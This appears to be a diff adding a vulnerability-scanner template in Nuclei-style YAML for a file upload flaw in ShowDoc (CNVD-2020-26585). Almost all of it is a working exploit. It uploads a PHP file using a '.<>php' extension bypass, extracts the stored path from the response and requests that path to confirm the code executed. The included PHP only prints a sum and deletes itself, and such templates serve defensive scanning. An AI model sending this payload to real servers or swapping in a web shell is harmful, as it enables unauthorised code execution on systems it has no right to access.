@@ -1,0 +1,41 @@
+id: yaml-poc-showdoc-showdoc-file_upload-CNVD-2020-26585
+info:
+  name: Yaml Poc Showdoc Showdoc File_Upload Cnvd 2020 26585
+  author: zikai.zhao
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-showdoc-showdoc-file_upload-CNVD-2020-26585'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /index.php?s=/home/page/uploadImg
+  body: "----------------------------{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"editormd-image-file\"; filename=\"{{filename}}.<>php\"\r\nContent-Type:\
+    \ text/plain\r\n\r\n<?php echo ''.({{s1}}-{{s2}}); unlink(__FILE__); ?>\r\n----------------------------{{rboundary}}--\r\
+    \n"
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - success
+  - type: regex
+    part: body
+    regex:
+    - (?P<date>\\d{4}-\\d{2}-\\d{2})\\\\/(?P<file>[a-f0-9]+\\.php)
+- method: GET
+  path:
+  - /Public/Uploads/{{date}}/{{file}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
